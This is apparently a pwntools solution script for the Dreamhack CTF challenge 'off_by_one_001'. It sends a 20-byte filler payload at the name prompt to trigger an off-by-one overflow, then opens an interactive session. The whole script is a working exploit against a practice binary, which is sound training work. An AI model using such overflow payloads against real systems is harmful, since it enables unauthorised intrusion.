from pwn import *

exe = ELF('./off_by_one_001', checksec=False)
# p = remote("host1.dreamhack.games", 12355)
p = process(exe.path)

payload = b'a'*20
p.sendlineafter(b'Name: ', payload)

p.interactive()